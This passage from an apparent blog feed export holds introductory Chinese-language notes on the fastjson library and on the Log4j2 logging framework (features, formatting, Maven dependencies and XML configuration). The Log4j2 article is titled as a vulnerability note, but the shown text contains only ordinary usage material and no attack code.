      "content_html": "\n<p>FastJson 是一个由阿里巴巴研发的java库，可以将 Java 对象转换为 JSON 格式，也可以将 JSON 字符串转换为 Java 对象。</p>\n<p>fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p>\n<p>fastjson 源码地址：https://github.com/alibaba/fastjson</p>\n<p>fastjson 中文 Wiki：https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</p>\n<h2>1. fastjson反序列化方式简介</h2>\n<p>fastjson<strong>序列化就是将java对象转化为json字符串，而反序列化就是将json字符串转化为java对象</strong>。</p>\n<p>fastjson有两种常见的处理JSON的方法：</p>\n<ul>\n<li><code>JSON.toJSONString()</code>方法：可将对象转换成<code>JSON</code>字符串</li>\n<li><code>JSON.parseObject()</code>方法：将<code>JSON</code>字符串转换成对象。</li>\n</ul>\n<p>maven引入</p>\n<div class=\"language-xml\" data-ext=\"xml\" data-title=\"xml\"><pre class=\"language-xml\"><code>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>com.alibaba<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>fastjson<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>xxx<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>User类：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">User</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> username<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setUsername</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> username<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>username <span class=\"token operator\">=</span> username<span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"call setUsername\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> username<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setAge</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"call setAge\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> age<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>进行序列化及反序列化：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> :xmsong\n * <span class=\"token keyword\">@date</span> : 2023/5/28 9:53\n */</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>alibaba<span class=\"token punctuation\">.</span>fastjson<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">JSON</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>alibaba<span class=\"token punctuation\">.</span>fastjson<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">JSONObject</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> parseObjectTest <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n<span class=\"token comment\">//序列化</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>\"</code></pre></div>",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "web主流应用漏洞-Log4j2",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/log4j2/log4j2%20.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/log4j2/log4j2%20.html",
      "summary": "web主流应用漏洞-Log4j2\n1. Apache Log4j2 介绍\n1.1 什么是Log4j2\n在日常的开发，测试和生产环境中，日志记录了应用，服务运行过程中的关键信息，以及出现异常时的堆栈，这些信息常常作为查询，定位，解决问题的关键，因此在任何系统中，对日志的使用得当，将极大的提高程序问题解决的效率。\nApache Log4j是一个Java 日...",
      "content_html": "\n<h2>1. Apache Log4j2 介绍</h2>\n<h3>1.1 什么是Log4j2</h3>\n<p>在日常的开发，测试和生产环境中，日志记录了应用，服务运行过程中的关键信息，以及出现异常时的堆栈，这些信息常常作为查询，定位，解决问题的关键，因此在任何系统中，对日志的使用得当，将极大的提高程序问题解决的效率。</p>\n<p>Apache Log4j是一个Java 日志框架， 旨在为应用程序提供记录日志的功能。 log4j大体可以分为2个版本： 1.x和2.x, 1.x已经不再维护，目前主流的应用版本是2.x, 2.x也被称为log4j2。使用非常广泛，被大量企业和系统所使用，</p>\n<ul>\n<li>\n<p>Log4j的1.x版本虽然已经被广泛使用于很多应用程序中，但由于出现内存泄漏等bug，代码难以维护，以及需要使用老版本的jdk等劣势，在2015年8月已经停止维护。</p>\n</li>\n<li>\n<p>SLF4J：SLF4J是众多日志系统的内核，提供统一的接口，不提供具体实现，不是具体可使用可配置的日志系统。</p>\n</li>\n<li>\n<p>Logback：提供了对SLF4J具体实现的日志系统，相比Log4j1.x，Logback的性能，使用场景，内存使用等方面的优化要远远强于Log4j1.x。</p>\n</li>\n<li>\n<p>Log4j2：Log4j2虽然在各个方面都与logback非常相似，但是却提供了更强的性能和并发性，下一代异步logger，易于拓展自定义需求的架构，是目前使用十分广泛的日志框架。</p>\n</li>\n</ul>\n<blockquote>\n<p>关于日志记录框架的一些基础：</p>\n<p>1、定义标准日志接口的框架，如：Commons Logging、SLF4J、JCL（Jakarta Commons Logging）、jboss-logging；</p>\n<p>2、实现标准日志接口定义的具体实现方案，如：Log4j，Log4j2，Logback，Java Util Logging(Jul)、slf4j-simple、slf4j-nop。</p>\n<p>3、Logback、slf4j-simple、slf4j-nop直接原生实现了slf4j的接口；</p>\n<p>4、 Log4j、Log4j2、Java Util Logging(Jul)没有直接实现slf4j接口，所以需要对应的适配类将SLF4J接口和具体实现类进行绑定（也就是说除了接口和实现类两个依赖外，还需要一个桥接包用于将接口和实现进行绑定）。</p>\n</blockquote>\n<p>log4j2 由四部分构成：</p>\n<ul>\n<li>Logger -- 负责捕获日志记录，并传递给 Appender，他是日志行为的发起者。</li>\n<li>Appender -- 负责将日志事件进行分类处理，将日志发往他应该去的目标去向，因此也可以称为 Handler。</li>\n<li>Layout -- Layout 负责在日志输出前决定日志的格式，因此也可以称为 Fomatter。</li>\n<li>Filter -- Filter 是可选的组件，每一个 Logger、Appender 甚至全局都可以配置若干个 Filter，来决定相应的组件对当前的日志时间是否关心。</li>\n</ul>\n<h3>1.2 Log4j2的特点</h3>\n<ul>\n<li>\n<p>自动重新加载配置：参考了Logback的设计，提供自动刷新参数配置，最实用的就是我们在生产上可以动态的修改日志的级别而无需重启应用</p>\n</li>\n<li>\n<p>异常处理：在logback中，Appender中的异常不会被应用感知到，但是在Log4j2中，提供了一些异常处理机制</p>\n</li>\n<li>\n<p>性能提升：log4j2相较于log4j和logback都具有很明显的性能提升，据官方测试，异步记录器的吞吐量比Log4j 1.x 和 Logback高18倍，延迟低</p>\n</li>\n<li>\n<p>无垃圾机制：（默认开启）log4j2在大部分情况下，都可以使用无垃圾机制【对象重用、内存缓冲】，避免频繁的日志收集导致的 jvm gc</p>\n</li>\n<li>\n<p>插件架构：Log4j2使用插件模式配置组件。因为无需编写代码来创建和配置Appender、Layout、Pattern Converyer等。在配置了的情况下，Log4j2自动识别插件并使用他们</p>\n</li>\n<li>\n<p>高级过滤：与Logback一样，Log4j2支持基于Log事件中的上下文数据，标记，正则表达式和其他组件进行过滤。此外，过滤器还可以与记录器关联。与Logback不同，Log4j2可以在任何这些情况下使用通用的Filter类</p>\n</li>\n<li>\n<p>更强大的参数格式化：</p>\n<p>Log4j的API与SLF4J相比，提供了更丰富的参数格式化功能。使用 {} 占位符格式化参数。用 {} 的方式来实现“format”的功能（参数会直接toString替换占位符），像下面这样：</p>\n</li>\n</ul>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>logging<span class=\"token punctuation\">.</span>log4j<span class=\"token punctuation\">.</span></span>Logger</span> logger <span class=\"token operator\">=</span> <span class=\"token class-name\">LogManager</span><span class=\"token punctuation\">.</span><span class=\"token function\">getLogger</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.xyz\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nlogger<span class=\"token punctuation\">.</span><span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Logging in user {} with birthday {}\"</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getBirthdayCalendar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>使用String.format形式格式化参数：Log4j2 中除了支持 {} 的参数占位符，还支持 String.format 的形式</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>logging<span class=\"token punctuation\">.</span>log4j<span class=\"token punctuation\">.</span></span>Logger</span> logger <span class=\"token operator\">=</span> <span class=\"token class-name\">LogManager</span><span class=\"token punctuation\">.</span><span class=\"token function\">getFormatterLogger</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.xyz\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nlogger<span class=\"token punctuation\">.</span><span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Logging in user %s with birthday %s\"</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getBirthdayCalendar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nlogger<span class=\"token punctuation\">.</span><span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Logging in user %1$s with birthday %2$tm %2$te,%2$tY\"</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getBirthdayCalendar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nlogger<span class=\"token punctuation\">.</span><span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Integer.MAX_VALUE = %,d、Long.MAX_VALUE = %,d\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token constant\">MAX_VALUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Long</span><span class=\"token punctuation\">.</span><span class=\"token constant\">MAX_VALUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 注意：如果想使用 String.format 的形式，需要使用 LogManager.getFormatterLogger 而不是 LogManager.getLogger</span>\n</code></pre></div><p>使用logger.printf格式化参数：Log4j2的Logger接口中，还有一个logger.printf()方法，无需创建 LogManager.getFormatterLogger，就可以使用 String.format 的形式</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>\n<span class=\"token class-name\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>logging<span class=\"token punctuation\">.</span>log4j<span class=\"token punctuation\">.</span></span>Logger</span> logger <span class=\"token operator\">=</span> <span class=\"token class-name\">LogManager</span><span class=\"token punctuation\">.</span><span class=\"token function\">getLogger</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.xyz\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nlogger<span class=\"token punctuation\">.</span><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Level</span><span class=\"token punctuation\">.</span><span class=\"token constant\">INFO</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Logging in user %1$s with birthday %2$tm %2$te,%2$tY\"</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getBirthdayCalendar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nlogger<span class=\"token punctuation\">.</span><span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Opening connection to {}...\"</span><span class=\"token punctuation\">,</span> someDataSource<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><h3>1.3 Log4j2的简单使用</h3>\n<p><strong>（1）引用依赖</strong></p>\n<p>在一般项目中使用Log4j2至少需要引用log4j-api-2.x和log4j-core-2.x这两个jar包。</p>\n<div class=\"language-xml\" data-ext=\"xml\" data-title=\"xml\"><pre class=\"language-xml\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.apache.logging.log4j<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>log4j-core<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>2.12.0<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.apache.logging.log4j<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>log4j-api<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>2.12.0<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>在spring boot项目中使用Log4j2</p>\n<div class=\"language-xml\" data-ext=\"xml\" data-title=\"xml\"><pre class=\"language-xml\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.springframework.boot<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>spring-boot-starter-web<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token comment\">&lt;!-- 排除spring boot默认日志logback --&gt;</span>\n    <span class=\"token comment\">&lt;!-- 注意！！！这里必须有 --&gt;</span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>exclusions</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>exclusion</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.springframework.boot<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>spring-boot-starter-logging<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>exclusion</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>exclusions</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token comment\">&lt;!-- 引入log4j2依赖 --&gt;</span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.springframework.boot<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>spring-boot-starter-log4j2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p><strong>（2）添加配置文件</strong></p>\n<p>配置文件log4j2.xml一般类似这样：</p>\n<div class=\"language-xml\" data-ext=\"xml\" data-title=\"xml\"><pre class=\"language-xml\"><code><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;</span>\n\n<span class=\"token comment\">&lt;!-- 配置LoggerConfig，即Appenders的日志级别为WARN --&gt;</span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Configuration</span> <span class=\"token attr-name\">status</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>WARN<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>  \n    <span class=\"token comment\">&lt;!-- Appenders支持配置多个Appender，支持向不同的目标输送日志，本例为配置向控制台输出 --&gt;</span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Appenders</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Console</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Console<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">target</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>SYSTEM_OUT<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PatternLayout</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Pattern</span><span class=\"token punctuation\">&gt;</span></span>%d{yyyy-MM-dd HH:mm:ss,SSS} [%t] %-5level %logger{0} - %msg%n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Pattern</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>PatternLayout</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Console</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Appenders</span><span class=\"token punctuation\">&gt;</span></span>\n    \n    <span class=\"token comment\">&lt;!-- Loggers支持配置多个Logger，可引用不同的目标Appender，也可根据业务需求定制特定要求的Appender --&gt;</span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Loggers</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token comment\">&lt;!-- name属性为项目包名或者类名 --&gt;</span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Logger</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>com.jourwon<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">level</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>debug<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">additivity</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>false<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>AppenderRef</span> <span class=\"token attr-name\">ref</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Console<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Logger</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Root</span> <span class=\"token attr-name\">level</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>error<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>AppenderRef</span> <span class=\"token attr-name\">ref</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Console<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Root</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Loggers</span><span class=\"token punctuation\">&gt;</span></span>\n    \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Configuration</span><span class=\"token punctuation\">&gt;</span></span>\n\n\n</code></pre></div><ul>\n<li>\n<p>默认情况下，Log4j2在classpath下查找名为log4j2.xml的配置文件。</p>\n</li>\n<li>\n<p>也可以使用Java启动命令指定配置文件的全路径。-Dlog4j.configurationFile=opt/demo/log4j2.xml</p>\n</li>\n<li>\n<p>还可以使用Java代码指定配置文件路径，例如</p>\n</li>\n</ul>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>logging<span class=\"token punctuation\">.</span>log4j<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LogManager</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>logging<span class=\"token punctuation\">.</span>log4j<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LoggerContext</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">File</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token class-name\">LoggerContext</span> loggerContext <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">LoggerContext</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">LogManager</span><span class=\"token punctuation\">.</span><span class=\"token function\">getContext</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">File</span> file <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"opt/demo/log4j2.xml\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    loggerContext<span class=\"token punctuation\">.</span><span class=\"token function\">setConfigLocation</span><span class=\"token 